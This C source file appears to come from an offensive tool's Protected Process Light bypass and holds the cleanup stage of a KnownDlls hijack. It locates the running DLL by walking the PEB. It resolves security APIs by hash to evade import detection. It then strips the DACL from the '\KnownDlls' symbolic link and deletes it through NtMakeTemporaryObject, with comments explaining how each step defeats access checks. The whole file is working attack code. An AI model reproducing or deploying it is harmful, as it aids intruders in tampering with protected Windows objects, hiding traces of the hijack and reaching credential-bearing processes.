#include "ppl/cleanup.h"

BOOL get_current_dll_filename(
    OUT LPCWSTR* ppwszDllName)
{
    // get the address of this code section
    PVOID IP = getIP();
    PND_PEB Peb = (PND_PEB)READ_MEMLOC(PEB_OFFSET);
    PND_PEB_LDR_DATA Ldr = Peb->Ldr;
    PVOID FirstEntry = &Ldr->InMemoryOrderModuleList.Flink;
    PND_LDR_DATA_TABLE_ENTRY Entry = (PND_LDR_DATA_TABLE_ENTRY)Ldr->InMemoryOrderModuleList.Flink;

    // loop over each loaded DLL
    for (; Entry != FirstEntry; Entry = (PND_LDR_DATA_TABLE_ENTRY)Entry->InMemoryOrderLinks.Flink)
    {
        // check if this code section is inside of this DLL

        if ((ULONG_PTR)Entry->DllBase > (ULONG_PTR)IP)
            continue;

        if (RVA(ULONG_PTR, Entry->DllBase, Entry->SizeOfImage) <= (ULONG_PTR)IP)
            continue;

        // save the DLL name
        *ppwszDllName = Entry->BaseDllName.Buffer;
        return TRUE;
    }

    return FALSE;
}

BOOL delete_known_dll_entry(VOID)
{
    BOOL bReturnValue = FALSE;

    LPCWSTR pwszDllName = NULL;
    BOOL success;
    NTSTATUS status = 0;
    HANDLE hLink = NULL;
    LPWSTR pwszLinkPath = NULL;
    UNICODE_STRING name = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    SECURITY_DESCRIPTOR sd = { 0 };

    SetKernelObjectSecurity_t SetKernelObjectSecurity;
    SetKernelObjectSecurity = (SetKernelObjectSecurity_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        SetKernelObjectSecurity_SW2_HASH,
        0);
    if (!SetKernelObjectSecurity)
    {
        api_not_found("SetKernelObjectSecurity");
        goto end;
    }

    InitializeSecurityDescriptor_t InitializeSecurityDescriptor;
    InitializeSecurityDescriptor = (InitializeSecurityDescriptor_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        InitializeSecurityDescriptor_SW2_HASH,
        0);
    if (!InitializeSecurityDescriptor)
    {
        api_not_found("InitializeSecurityDescriptor");
        goto end;
    }
    SetSecurityDescriptorDacl_t SetSecurityDescriptorDacl;
    SetSecurityDescriptorDacl = (SetSecurityDescriptorDacl_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        SetSecurityDescriptorDacl_SW2_HASH,
        0);
    if (!SetSecurityDescriptorDacl)
    {
        api_not_found("SetSecurityDescriptorDacl");
        goto end;
    }

    success = get_current_dll_filename(&pwszDllName);
    if (!success)
        goto end;

    //
    // Build the path of the symbolic link object to delete. The name of the DLL can be determined
    // at runtime by invoking 'GetCurrentDllFileName'. The final path will be something such as 
    // '\KnownDlls\DPAPI.dll'.
    //
    pwszLinkPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszLinkPath)
    {
        malloc_failed();
        goto end;
    }

    wcsncpy(pwszLinkPath, L"\\KnownDlls\\", MAX_PATH);
    wcsncat(pwszLinkPath, pwszDllName, MAX_PATH);

    DPRINT("Object to delete: %ls", pwszLinkPath);

    name.Buffer  = pwszLinkPath;
    name.Length  = (USHORT)wcsnlen(name.Buffer, MAX_PATH);;
    name.Length *= 2;
    name.MaximumLength = name.Length + 2;
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //
    // Here we want to call NtOpenSymbolicLinkObject with DELETE access because we want to delete
    // the link. Unfortunately, the inherited ACL does not grant us this right and we will thus 
    // get an "Access denied" error. What we can do though is open the symbolic link object with
    // WRITE_DAC access in order to change the ACL of the object.
    //
    status = NtOpenSymbolicLinkObject(
        &hLink,
        WRITE_DAC,
        &oa);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenSymbolicLinkObject", status);
        goto end;
    }

    DPRINT("NtOpenSymbolicLinkObject('%ls', WRITE_DAC) OK", pwszLinkPath);

    //
    // Prepare the Security Descriptor. Here we will just use a NULL DACL. This will give everyone
    // access to the object but that's not really an issue because we'll delete it right after.
    //
    success = InitializeSecurityDescriptor(
        &sd,
        SECURITY_DESCRIPTOR_REVISION);
    if (!success)
    {
        function_failed("InitializeSecurityDescriptor");
        goto end;
    }

    success = SetSecurityDescriptorDacl(
        &sd,
        TRUE,
        NULL,
        FALSE);
    if (!success)
    {
        function_failed("SetSecurityDescriptorDacl");
        goto end;
    }

    //
    // Apply the new Security Descriptor.
    //
    success = SetKernelObjectSecurity(
        hLink,
        DACL_SECURITY_INFORMATION,
        &sd);
    if (!success)
    {
        function_failed("SetKernelObjectSecurity");
        goto end;
    }

    DPRINT("SetKernelObjectSecurity OK");

    //
    // At this point we can close the object handle because only the WRITE_DAC right is associated
    // to it. This handle will not allow us to delete the object.
    //
    status = NtClose(hLink); hLink = NULL;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtClose", status);
        goto end;
    }

    DPRINT("NtClose OK");

    //
    // This time, we should be able to open the link object with DELETE access.
    //
    status = NtOpenSymbolicLinkObject(
        &hLink,
        DELETE,
        &oa);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenSymbolicLinkObject", status);
        goto end;
    }

    DPRINT("NtOpenSymbolicLinkObject('%ls', DELETE) OK", pwszLinkPath);

    //
    // Now, we can invoke NtMakeTemporaryObject to disable the "Permanent" flag of the object. When
    // an object does not have the "Permanent" flag enabled, it is automatically deleted when all 
    // its handles are closed.
    //
    status = NtMakeTemporaryObject(hLink);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtMakeTemporaryObject", status);
        goto end;
    }

    DPRINT("NtMakeTemporaryObject OK");

    bReturnValue = TRUE;

end:
    if (hLink)
        NtClose(hLink);
    if (pwszLinkPath)
        intFree(pwszLinkPath);

    return bReturnValue;
}
